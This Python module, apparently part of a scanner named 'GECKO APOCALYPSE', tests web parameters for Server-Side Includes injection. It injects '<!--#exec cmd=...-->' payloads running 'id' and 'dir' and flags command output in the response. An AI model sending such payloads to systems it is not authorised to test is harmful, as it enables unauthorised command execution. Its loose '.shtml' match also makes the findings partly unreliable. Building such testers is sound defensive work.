"""GECKO APOCALYPSE - Server-Side Includes (SSI) Tester"""

import asyncio
from typing import Dict, List
from urllib.parse import parse_qs, urlencode, urlparse

import aiohttp


class SSITester:
    def __init__(self, session, config, db):
        self.session = session
        self.config = config
        self.db = db

    async def scan(self, url, content, headers, response):
        findings = []
        parsed = urlparse(url)

        # Usually found in .shtml, .stm, .shtm files
        if not any(url.endswith(ext) for ext in [".shtml", ".shtm", ".stm"]):
            return findings

        params = parse_qs(parsed.query)
        payloads = [
            '<!--#exec cmd="id" -->',
            '<!--#exec cmd="dir" -->',
            '<!--#echo var="DOCUMENT_NAME" -->',
        ]

        for param in params:
            for p in payloads:
                test = self._inject(url, param, p)
                try:
                    async with self.session.get(
                        test, timeout=aiohttp.ClientTimeout(total=10)
                    ) as r:
                        c = await r.text(errors="ignore")
                        # Check for command execution output
                        if "uid=" in c or "<DIR>" in c or ".shtml" in c:
                            findings.append(
                                {
                                    "type": "Server-Side Includes (SSI) Injection",
                                    "severity": "CRITICAL",
                                    "url": url,
                                    "parameter": param,
                                    "payload": p,
                                    "evidence": "Command output or SSI variable found in response",
                                    "cwe": "CWE-97",
                                    "owasp": "A03:2021",
                                }
                            )
                            break
                except:
                    pass
        return findings

    def _inject(self, url, param, value):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        return parsed._replace(query=urlencode(params, doseq=True)).geturl()
